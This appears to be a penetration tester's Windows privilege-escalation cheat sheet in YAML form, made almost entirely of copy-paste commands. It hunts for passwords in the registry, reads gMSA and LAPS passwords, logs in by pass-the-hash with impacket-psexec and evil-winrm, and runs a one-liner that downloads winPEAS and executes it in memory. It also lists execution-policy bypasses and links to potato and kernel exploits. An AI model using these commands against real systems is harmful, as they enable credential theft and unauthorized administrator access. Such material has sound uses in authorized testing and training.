---
functions:
  privilege-escalation:
    - description: Simplistic and standard checklist for windows privilege escalation, in no particular order
      code: |
        Feel free to copy paste the entire listing below
        - [ ] $env:UserName
        - [ ] $Env:Path
        - [ ] $env:PSModulePath
        - [ ] whoami /all #https://gtworek.github.io/Priv2Admin/
        - [ ] net user
        - [ ] net user <username>
        - [ ] hostname
        - [ ] type (Get-PSReadlineOption).HistorySavePath
        - [ ] systeminfo
        - [ ] systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
        - [ ] tasklist
        - [ ] wmic process where "ProcessID=1111" get CommandLine, ExecutablePath
        - [ ] wmic process where name^="hfs.exe" get ProcessId,Name,CommandLine
        - [ ] wmic process where name^="hfs.exe" call GetOwner
        - [ ] accesschk.exe -qvp -accepteula *  #check write access to services
        - [ ] ./accesschk64.exe -qvp -accepteula * #check write access to processes
        - [ ] tasklist /SVC
        - [ ] tasklist /v
        - [ ] ipconfig /all
        - [ ] route print
        - [ ] netstat -ano
        - [ ] netsh advfirewall show currentprofile
        - [ ] netsh advfirewall firewall show rule name=all
        - [ ] schtasks /query /fo LIST /v
        - [ ] schtasks /query /fo LIST /v | findstr /C:"Task To Run:"
        - [ ] driverquery /v
        - [ ] driverquery /v | findstr /V /C:"Microsoft" /C:"Windows "
        - [ ] driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
        - [ ] wmic product get name, version, vendor
        - [ ] wmic qfe get Caption, Description, HotFixID, InstalledOn
        - [ ] wmic logicaldisk get caption,description,providername
        - [ ] wmic service get name,displayname,pathname,startmode | findstr /i "auto"  
        - [ ] wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /V "Windows"  
        - [ ] wmic service list full
        - [ ] accesschk64.exe -wuvc * /accepteula
        - [ ] wmic qfe list
        - [ ] wmic startup get Name,command 
        - [ ] wmic /output:services.htm /node:localhost service list full / format:htable
        - [ ] Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List 
        - [ ] reg query HKLM /f pass /t REG_SZ /s | findstr "CurrentPass"
        - [ ] reg query HKLM /f password /t REG_SZ /s
        - [ ] reg query HKCU /f password /t REG_SZ /s
        - [ ] reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
        - [ ] reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
        - [ ] reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        - [ ] get-process | select name, path, starttime, ID | ?{$_.Path -like '*appdata*'} | fl
        - [ ] ./accesschk64.exe -accepteula -c Apache2.4 -l   # service control permission check
        - [ ] mountvol
        - [ ] netsh interface ipv4 show excludedportrange protocol=tcp
        - [ ] cmdkey /list
        - [ ] Are non-standard apps storing configs in appdata?

    - description: Search for common credential locations
      code: |
        - [ ] cmdkey /list
        - [ ] AD Svc Account Stored Password
                Import-Module ActiveDirectory
                Get-ADServiceAccount -Filter * [-Properties *]
                $gmsa = Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
                $mp = $gmsa.'msDS-ManagedPassword'
                Can you Read $mp?
                ./GMSAPasswordReader.exe --accountname svc_apache  #rc4_hmac --> nthash

                impacket-psexec 'svc_apache$'@192.168.165.165 -hashes 78BC82C952449150A12AD60E870A2BE4:78BC82C952449150A12AD60E870A2BE
                evil-winrm -i 192.168.165.165 -u svc_apache$ -H 78BC82C952449150A12AD60E870A2BE4

        - [ ] LAPS Passwords
                Import-Module ActiveDirectory
                Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'

                https://mfnttps.github.io/mfnttps/ldap-enum/

        - [ ] reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

    - description: itm4n PrivescCheck
      code: |
        Basic usage
        From a command prompt:

        C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

        From a PowerShell prompt:

        PS C:\Temp\> Set-ExecutionPolicy Bypass -Scope process -Force
        PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck

        From a PowerShell prompt without modifying the execution policy:

        PS C:\Temp\> Get-Content .\PrivescCheck.ps1 | Out-String | IEX
        PS C:\Temp\> Invoke-PrivescCheck
        powershell -c "Get-Content .\PrivescCheck.ps1 | Out-String | IEX;Invoke-PrivescCheck"


    - description: WinPeas
      code: |
        # One liner to download and execute winPEASany from memory in a PS shell
        $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")

        winpeas.exe #run all checks (except for additional slower checks - LOLBAS and linpeas.sh in WSL) (noisy - CTFs)
        winpeas.exe systeminfo userinfo #Only systeminfo and userinfo checks executed
        winpeas.exe notcolor #Do not color the output
        winpeas.exe domain #enumerate also domain information
        winpeas.exe wait #wait for user input between tests
        winpeas.exe debug #display additional debug information
        winpeas.exe log #log output to out.txt instead of standard output
        winpeas.exe -linpeas=http://127.0.0.1/linpeas.sh #Execute also additional linpeas check (runs linpeas.sh in default WSL distribution) with custom linpeas.sh URL (if not provided, the default URL is: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)
        winpeas.exe -lolbas  #Execute also additional LOLBAS search check

    - description: Windows Exploitation Suggester
      code: |
        pip install wesng
        git clone https://github.com/bitsadmin/wesng --depth 1

        (1) wes.py --update 
        (2) systeminfo > systeminfo.txt
        (3) wes.py systeminfo.txt
            wes.py sysinfo -e -i "Elevation of Privilege"
    
    - description: Windows Exploit Suggester
      code: |
        pip install xlrd==1.2.0
        wget https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/win-exp-suggester/windows-exploit-suggester.py
        python2 windows-exploit-suggester.py --update
        python2 windows-exploit-suggester.py --database 2021-12-31-mssb.xls --systeminfo sysinfo

    - description: Sherlock
      code: |
        powershell -ep bypass -c ". ./Sherlock.ps1; Find-AllVulns"

    - description: List of sure fire ways to escalate
      code: |
        - [ ] Is the account a "service account" with impersonatetoken or assignprimarytoken? *potato ftw!
            https://mfnttps.github.io/mfnttps/win-sweet_potato/
            https://mfnttps.github.io/mfnttps/win-juicy_potato/
            https://mfnttps.github.io/mfnttps/win-print_spoofer/
        - [ ] Is the latest KB patch (wmic qfe list) BEFORE March 2020 and port 445 is open? smb3LPE ftw!
            https://www.exploit-db.com/exploits/48537
            https://github.com/danigargu/CVE-2020-0796
        - [ ] Vulnerable to MS10-059?  Chimichurri ftw! <- older servers
            https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri
            https://github.com/Re4son/Chimichurri
        - [ ] Older 2008 R2? Vuln to MS15-051?
            https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip

resources: |
  https://github.com/itm4n/PrivescCheck
  https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
  https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
  https://github.com/bitsadmin/wesng
  https://github.com/rasta-mouse/Sherlock
  https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
  https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester
  https://www.thehacker.recipes/ad/movement/access-controls/readgmsapassword
  https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
---